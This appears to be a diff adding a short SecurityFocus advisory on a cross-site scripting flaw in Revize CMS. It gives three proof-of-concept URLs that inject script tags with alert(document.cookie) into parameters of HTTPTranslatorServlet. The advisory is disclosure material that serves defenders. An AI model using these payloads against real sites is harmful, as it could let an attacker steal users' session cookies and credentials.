@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/15484/info
+
+Revize CMS is prone to a cross-site scripting vulnerabilities. This is due to a lack of proper sanitization of user-supplied input.
+
+An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/revize/HTTPTranslatorServlet?redirect=/revize/admincenter/setWebSpace.jsp&action=login&resourcetype=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3Esecurity&objectmap=subject&error=admincenter/login.jsp
+http://www.example.com/revize/HTTPTranslatorServlet?redirect=/revize/admincenter/setWebSpace.jsp&action=login&resourcetype=security&objectmap=subject%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&error=admincenter/login.jsp
+http://www.example.com/revize/HTTPTranslatorServlet?redirect=/revize/admincenter/setWebSpace.jsp%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&action=login&resourcetype=security&objectmap=subject&error=admincenter/login.jsp
+
